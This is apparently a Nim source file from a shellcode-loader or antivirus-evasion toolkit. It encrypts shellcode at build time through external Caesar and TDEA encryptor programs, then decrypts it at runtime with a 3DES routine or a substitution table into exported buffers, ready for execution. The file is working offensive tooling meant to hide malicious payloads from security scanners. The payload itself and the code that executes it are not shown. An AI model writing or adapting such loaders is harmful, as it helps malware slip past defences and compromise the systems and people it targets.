{.compile: "encryption\\des.c".}
proc D3DES_Decrypt(plainBuffer:cstring,keyBuffer:cstring,cipherBuffer:cstring,n:cint):cint {.importc,cdecl.}
import base64,strutils,sequtils

const source {.strdefine.}: string = ""
var code*:cstring
var codelen*:cint = 0

proc de3des(enbase64:string): void =
    let shellcode:string = decode(enbase64) 
    let plain_len_byte = cast[int16]([shellcode[0],shellcode[1]])
    let input_encode:cstring = shellcode[26..high(shellcode)]
    let key:cstring = shellcode[2..25]
    var str = cast[cstring](alloc0(plain_len_byte));
    discard D3DES_Decrypt(input_encode,key,str,cast[cint](plain_len_byte))
    code = str
    codelen = plain_len_byte

proc caesar(result:string): void =
    let decodres = decode(result)
    let dic = decodres[0..255].mapIt(it.byte)
    let table = decodres[256..high(decodres)].mapIt(it.byte)
    var deshellcode = newSeq[uint8](table.len)
    for i in 0..254:
        for k in 0..high(table):
            deshellcode[k] = dic[table[k]]
    code = deshellcode.mapIt(it.char).join
    codelen = cast[cint](deshellcode.len)

when defined(Caesar):
    const enbase64 = staticExec("encryption\\Caesar.exe " & source)
    caesar(enbase64)

when defined(TDEA):
    const enbase64 = staticExec("encryption\\Tdea.exe " & source)
    de3des(enbase64)